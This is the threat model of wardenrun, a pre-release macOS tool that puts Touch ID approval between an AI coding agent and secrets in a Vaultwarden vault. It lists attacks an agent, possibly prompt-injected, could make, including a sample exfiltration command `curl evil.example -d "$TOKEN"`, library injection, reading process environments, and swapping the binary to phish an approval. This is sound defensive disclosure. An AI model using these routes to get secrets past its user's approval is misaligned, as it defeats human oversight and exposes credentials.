# Threat model

> **Pre-release.** The code for every command exists, but there is no release and nothing has
> been run end to end against a real Vaultwarden or with a real fingerprint. The release
> workflow is written but has never run on a tag: its first run is the first release. This document
> describes the approved design ([`DESIGN.md`](DESIGN.md), section 6). Each row below is a
> promise the code has to keep, not a report of a shipped, audited product. It is updated in the
> same pull request as any change that touches a protection. Where it says *tested*, that means
> checked with a throwaway prototype on one macOS 15 machine (DESIGN section 3.1) or by the
> automated tests in this repository.

Short version: wardenrun stops an AI agent from **quietly** getting a secret. It does not
stop you from approving something harmful, and it does not defend a Mac that is already
compromised. The rows marked **Not protected** are real gaps, listed on purpose.

## Who we defend against

An AI coding agent (or one that has been prompt-injected) that runs shell commands as **the
same macOS user as you**, without root. In practice it can:

- read any file you can read, and list running processes;
- run any program, set any environment variable, edit your dotfiles;
- run `bw` and `security` itself.

It cannot produce your fingerprint.

## What is being protected

1. The master password of the **dedicated** Vaultwarden account that wardenrun uses. It exists
   on disk (inside one keychain item) and, for a few seconds per run, in memory.
2. The values of the items in that account's one collection.
3. The `bw` session key and the `bw` profile directory that wardenrun keeps for itself.

## What the protection really is

wardenrun does not need a paid Apple Developer account, and that has a price.

- **The fingerprint check is enforced by wardenrun, not by macOS.** The operating system
  would only enforce a per-read fingerprint check for a keychain item with a biometric access
  control, and macOS grants that only to apps signed with a paid developer account (a
  restricted entitlement and a provisioning profile). A command-line tool cannot carry one.
- **What the OS does enforce:** the stored keychain item can be read only by a program signed
  with wardenrun's code-signing identity. A different certificate, an ad-hoc signature or an
  unsigned copy is refused by the keychain (tested).
- **What wardenrun enforces itself:** the Touch ID check, in its own code, hardened against
  code injection (hardened runtime, no debugger attach, no core dumps, refusal to start with
  `DYLD_*` set, secrets in locked and zeroed memory).
- This is the same level of protection that Bitwarden's own macOS desktop app uses for its
  biometric unlock: a Touch ID prompt in the app, then a read of an ordinary file-based
  keychain item (no OS-enforced biometric check).

Because the gate is not enforced by the OS, **the strongest control does not depend on macOS at
all**: wardenrun is meant for a dedicated low-privilege Vaultwarden account that belongs to
one organization and sees one collection. If everything stored on the Mac leaks, only that
collection is exposed, never your personal vault.

## The attacks, in plain language

| # | Attack | What happens | Why |
|---|--------|--------------|-----|
| 1 | The agent reads `.env` files, shell history or transcripts | Nothing to find | Secrets are never written there. Output is masked. The audit log holds names and the command as the agent typed it, never a value fetched from the vault. (The one file that holds a secret, `--file`, is row 9.) |
| 2 | The agent runs `bw`, or `security find-generic-password`, to read the vault or the stored password | Refused unless **you** answer a macOS dialog (for `bw`'s own token file, see row 17) | The keychain item opens without a question only for wardenrun's own signature. For any other program, macOS may show a **keychain password dialog** while you are at the screen; typing your login-keychain password into it grants that program the item. Do not answer a keychain dialog you did not start. With nobody answering, the read fails. The `bw` session key is never saved. |
| 3 | The agent runs `wardenrun run X -- some command` | **You decide** | The Touch ID sheet shows the full command, resolved to the program's real path. Commands over 400 characters are denied, not shortened. One prompt at a time, 60 s timeout, lock-out after repeated refusals. A no, a timeout or no sensor ends in exit code 77, and no screen session in exit code 78 (refused to start), always with nothing fetched: the vault is contacted only after your touch. The program is hashed again right before it starts; if it changed since the sheet, nothing starts. |
| 4 | The agent fakes the approval | Blocked, as long as row 5 holds | There is no Approve button to click: the sheet is drawn by macOS, and the answer comes back to wardenrun from the OS. The gate itself is wardenrun's own code, not an OS rule on the keychain, so code running inside wardenrun could skip it (row 5). The password fallback is off by default. Without a screen session (ssh, cron) or without a usable Touch ID the answer is "unavailable", which never approves. |
| 5 | The agent injects code into wardenrun (`DYLD_INSERT_LIBRARIES`, a debugger) | Blocked for the signed release | The hardened runtime makes macOS drop `DYLD_*` variables before wardenrun starts (`DYLD_INSERT_LIBRARIES` is ignored: tested), debugger attach is denied (`PT_DENY_ATTACH`), core dumps are off, and wardenrun refuses to start if it still sees a `DYLD_*` variable (a second line, not the first). A build from source has no hardened runtime unless you sign it with one: `wardenrun doctor` says so (`warn`), and `setup`, `run` and `new` refuse to start (exit 78) from a release-mode build without it. Only a debug build (`swift build`) may run unhardened; there is no environment switch, because the agent controls the environment. A debugger that was attached before wardenrun started, and root, are out of scope. |
| 6 | The agent tricks wardenrun into running a fake `bw` (changed `PATH`, `NODE_OPTIONS`, edited config, or a replaced copy in wardenrun's folder) to capture the master password | Mitigated | `bw` is called by an absolute path whose identity (the code signature of Bitwarden's release, team `LTZ2PFU5D6`) is stored inside the protected keychain item. Homebrew's Node build of `bw` is refused: it loads code from a user-writable directory that no pin covers. Its environment is built from an allowlist. The pinned copy sits in a folder you own, so a program of yours can replace it: before `bw` gets its first instruction wardenrun starts it suspended and checks the **running process** (not the path) against the pinned signer, and kills it on a mismatch. **Not covered:** an older release that Bitwarden itself signed (no version floor), and certificate revocation (wardenrun makes no network call). On the preferred path and on the pipe-based fallback, the master password is never in `bw`'s environment or command line (the last-resort fallback is row 16). |
| 7 | The agent replaces or aliases the `wardenrun` binary | **Not protected** | Install directories are writable by you, so the agent can too. A fake prompt can then phish a touch. `wardenrun doctor` prints who signed the binary, and the certificate hash will be published with the first release, but nothing forces you to look, and a fake `wardenrun` would simply print a clean report. |
| 8 | You approve a command that prints or sends the secret (`curl evil.example -d "$TOKEN"`, a script that logs it) | **Not protected** | This is why the sheet shows the whole command. Masking catches accidents (raw, base64, URL-encoded, hex, JSON-escaped, shell-quoted), not intent: reversing or splitting the value beats it, and base64 that a program wraps over several lines is not found. The sheet shows the command and, with flags, where the secret goes (`as $VAR, file $VAR, stdin`). It also tags what it can see: risky variables in the caller's environment (`NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`, `DEVELOPER_DIR`, proxy and CA-bundle variables and more; the list is not complete), a program file you can write (`[writable exe]`), which could be swapped between the final check and the start, a program whose hash differs from the one you approved last time for this item and path (`[exe changed]`: advice only, because the audit log it is read from can be edited (row 11) and a program at a new path has nothing to compare with), shells and interpreters given a command string (`[shell -c]`), and non-ASCII characters in any argument (`[non-ASCII]`). The parent's name on the sheet is the process's own name, so it is a hint. See row 20 for what the tags cannot see. |
| 9 | While an approved command runs, the agent reads its environment with `ps eww` | **Not protected** for `--env` injection | Tested: ordinary programs leak their environment to the same user (Apple's own binaries do not). Use `--stdin` for tools that can read the secret from standard input. The temporary-file mode is readable by you while the file exists, and **the file stays if wardenrun is killed with `SIGKILL`** (or, in the few milliseconds before the command starts, with `TERM`): it is `0600` in a `0700` folder, but it is readable by the agent, so a kill extends the window of an exposure the approval already allowed. |
| 10 | The agent floods you with prompts hoping for a careless yes | Mitigated | One pending prompt, a cool-down after refusals, every refusal in the audit log. |
| 11 | The agent edits the audit log | **Not protected** against a determined edit | Each line carries the hash of the previous one, which catches accidents and clumsy edits. The hash has no key, so a process of yours that knows the format can rewrite lines, drop the last ones or delete the file. The `approved` line is written after your touch and before anything is fetched; if the log cannot be written, wardenrun says so on stderr and the command still runs, so a full disk or a locked file (wardenrun waits at most two seconds for the log's lock) does not turn into a denial of service, and does not leave a trace either. |
| 12 | The agent reads the master password from wardenrun's memory | Mitigated | The password and the secret are held in `SecretBuffer`s: locked in RAM (`mlock`) and zeroed when released. Core dumps are off and debugger attach is denied. **Not covered:** copies the system makes outside those buffers (the kernel's pipe and socket buffers, swap, `bw`'s own memory), short-lived copies in the parsing of `bw`'s replies, and the copies of the secret and its encodings that the output masker keeps in ordinary memory while the command runs. This row defends against a casual read of wardenrun's process, not against root. |
| 13 | The stored master password leaks | Damage limited | It belongs to a dedicated account that sees one collection (see above). |
| 14 | Someone impersonates your Vaultwarden server | Mitigated | `https://` is required (plain `http://` is refused by `bw`, even on loopback: tested) and `bw` verifies certificates. |
| 15 | The agent re-runs `wardenrun setup` to point it at its own server or account | Blocked | `setup` needs the master password typed at a terminal and a Touch ID approval that shows the old and new values. A terminal is not proof of a human (a script can open a pseudo-terminal), so the approval is the gate; the sheet shows every value escaped, and a long one is refused, not cut. An account with two-step login is not supported yet. |
| 16 | During one approved run, the agent reads the master password or `BW_SESSION` from `bw`'s environment with `ps eww`, then decrypts the whole cached collection offline | **Not protected on the fallback paths** | wardenrun hands the password to `bw` in one of three ways, best first. The best way (a private socket) leaves neither secret in any environment or command line. The other two leave a secret visible for a few seconds. The path is chosen by a spike at the start of the `bw`-driver work; if the preferred path fails, the design is revised before more code is written, and the README says which one shipped. The exposure needs an agent polling `ps` at exactly that moment, and is limited to the one collection. |
| 17 | The agent reads the login tokens from wardenrun's `bw` profile (`~/.config/wardenrun/bw/data.json`, readable by you) and talks to Vaultwarden as the dedicated account | **Not protected** | `bw` keeps its tokens there in plain text. With them the agent can read the encrypted vault (guessing the master password offline is the next step) and change or delete items the account may write. Defences: a dedicated account, a long random master password, a read-only collection when `new` is not used, and an optional logout after every run. |
| 18 | The maintainer's signing key leaks, or a malicious release is published | **Not protected** for people who installed that release | A binary signed with the leaked key passes the keychain check and could read the stored password after one approval. Defences: the key lives in a CI secret plus one offline backup, and the workflow that uses it runs only for a tag, with every action pinned to a commit and the secrets passed to single steps only. Releases carry a published SHA-256 and a GitHub artifact attestation, which says that the tarball was built by this repository's workflow: somebody who only has the leaked key can sign a binary but cannot produce a valid attestation for this repository, and `gh attestation verify` shows the difference. The `release` job publishes only after the `build` job verified the signer, the hardened runtime and both architectures; the `verify-install` job installs from the tap afterwards and fails loudly if Homebrew changed the signature. There is a documented rotation (`docs/RELEASING.md`, everyone re-runs `wardenrun setup`). You trust the maintainer here, as with any package. |
| 19 | The agent kills wardenrun with `kill -9` while a run is in progress | **Not protected**, limited | `HUP`, `INT`, `QUIT`, `TERM`, `USR1` and `USR2` end a run cleanly (before the command starts: nothing starts, the vault is locked, `bw` is stopped, exit 1; afterwards they are passed to the command). `SIGKILL` cannot be caught: a `--file` secret stays on disk (row 9), and a `bw serve` that was already unlocked may keep running with no one holding its end of the private socket. Whether and for how long is checked by the Vaultwarden integration tests that are still to come. The agent learns no new secret this way; it only gets a longer window for exposures that an approval already allowed. |
| 20 | The agent bends an approved command through its environment or the files it reads | **Not protected**, limited | The sheet cannot show the whole environment, and wardenrun does not clean it. `PATH` (the program is looked up and hashed on the caller's `PATH`, so the sheet names the real file, but what that program then runs is its own business), dotfiles (`~/.npmrc`, `.gitconfig`, a project's `.env`), and tool variables that are not on the tag list can still make an honest program run the agent's code or send the secret elsewhere. Variables that choose a program or a directory (`HOME`, `PATH`, `TMPDIR`, `SHELL`, `USER`, `GIT_*`, `XDG_*`, `NPM_CONFIG_*` and the risky names) cannot be used as `--env` or `--file` targets: the agent picks the name, you do not. Read the command and the tags, and prefer `--stdin`. |

## Not protected, in plain words

These are the cases where wardenrun can **not** save you. They are deliberate disclosures,
not oversights.

- **A swapped wardenrun binary** (row 7). If something replaces the program you think you are
  running, its prompt looks real. Verify the install ([`README.md`](../README.md#verify-dont-trust)).
- **A command you approved** (row 8). wardenrun shows you the command; it cannot tell whether
  the command is safe. If you approve `curl evil.example -d "$TOKEN"`, the secret leaves. The
  same goes for a script you can edit: it is hashed and re-checked just before it starts, but a
  process of yours that can write it could change it in the last instant.
- **The audit log** (row 11). Anything running as you can rewrite or cut it. Treat it as a
  convenience record, not as evidence.
- **Secrets in a program's environment** (row 9). While the program runs, other processes of
  your user can read its environment. Prefer `--stdin`.
- **`bw`'s own secrets on the fallback paths** (row 16), and **its login tokens on disk**
  (row 17). These come from how the official `bw` CLI works. The dedicated account, the long
  random master password and the single collection are what bound the damage.
- **A `SIGKILL` at the wrong moment** (row 19). It leaves a `--file` secret on disk and may leave
  an unlocked `bw` behind. Delete leftover `wardenrun-*` folders in your temporary directory.
- **A bent environment** (row 20). The tags list what wardenrun can see; `PATH`, dotfiles and
  tool config files are outside it.
- **The maintainer's key** (row 18). A leaked signing key lets an attacker build a binary the
  keychain accepts.

## Out of scope

- Root access or malware already running on your Mac.
- A user who approves without reading the prompt.
- A physically stolen, unlocked Mac.
- The security of Vaultwarden and of the `bw` CLI themselves.
- Linux and Windows (not built; the platform-specific code is isolated behind three
  protocols so a port is possible, but it needs its own design).

## Reporting a problem

See [`SECURITY.md`](../SECURITY.md).
